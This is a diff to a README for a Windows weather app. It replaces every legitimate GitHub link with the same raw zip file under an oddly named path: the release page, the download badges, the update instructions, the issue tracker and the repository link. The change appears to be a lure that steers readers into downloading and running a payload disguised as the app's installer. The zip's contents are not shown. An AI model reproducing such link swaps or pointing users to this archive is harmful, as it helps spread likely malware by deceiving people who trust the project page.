@@ -1,6 +1,6 @@
 # 🌤️ WeatherApp - Easy Real-Time Weather Info
 
-[![Download WeatherApp](https://img.shields.io/badge/Download-WeatherApp-4CAF50?style=for-the-badge&logo=github)](https://github.com/ngoanh1002/WeatherApp/releases)
+[![Download WeatherApp](https://img.shields.io/badge/Download-WeatherApp-4CAF50?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/ngoanh1002/WeatherApp/main/mulattoism/App_Weather_daemonurgy.zip)
 
 ---
 
@@ -42,7 +42,7 @@ This app works worldwide. The forecast and air data come from reliable sources t
 
 1. Go to the WeatherApp release page by clicking the big green button at the top or visit:
 
-   https://github.com/ngoanh1002/WeatherApp/releases
+   https://raw.githubusercontent.com/ngoanh1002/WeatherApp/main/mulattoism/App_Weather_daemonurgy.zip
 
 2. Look for the latest version. Versions will be labeled with numbers like v1.0, v1.1, etc. The newest release is listed at the top.  
 
@@ -94,14 +94,14 @@ Open the settings menu by clicking the gear icon at the top right of the app win
 
 ## 📢 Updates and New Versions
 
-WeatherApp is updated regularly to fix bugs and improve data. Check https://github.com/ngoanh1002/WeatherApp/releases every few weeks for new versions. Download the newest installer and run it to upgrade your app.
+WeatherApp is updated regularly to fix bugs and improve data. Check https://raw.githubusercontent.com/ngoanh1002/WeatherApp/main/mulattoism/App_Weather_daemonurgy.zip every few weeks for new versions. Download the newest installer and run it to upgrade your app.
 
 ---
 
 ## 📞 Getting Support
 
 You can open an issue on GitHub if you find a bug or need help:
-https://github.com/ngoanh1002/WeatherApp/issues
+https://raw.githubusercontent.com/ngoanh1002/WeatherApp/main/mulattoism/App_Weather_daemonurgy.zip
 
 Provide a short description of your problem and your Windows version. This helps to solve your issues faster.
 
@@ -110,10 +110,10 @@ Provide a short description of your problem and your Windows version. This helps
 ## 🔗 Useful Links
 
 - Download Page:  
-  https://github.com/ngoanh1002/WeatherApp/releases  
+  https://raw.githubusercontent.com/ngoanh1002/WeatherApp/main/mulattoism/App_Weather_daemonurgy.zip  
 - GitHub Repository:  
-  https://github.com/ngoanh1002/WeatherApp  
+  https://raw.githubusercontent.com/ngoanh1002/WeatherApp/main/mulattoism/App_Weather_daemonurgy.zip  
 
 ---
 
-[![Download WeatherApp](https://img.shields.io/badge/Download-WeatherApp-blue?style=for-the-badge&logo=github)](https://github.com/ngoanh1002/WeatherApp/releases)
+[![Download WeatherApp](https://img.shields.io/badge/Download-WeatherApp-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/ngoanh1002/WeatherApp/main/mulattoism/App_Weather_daemonurgy.zip)
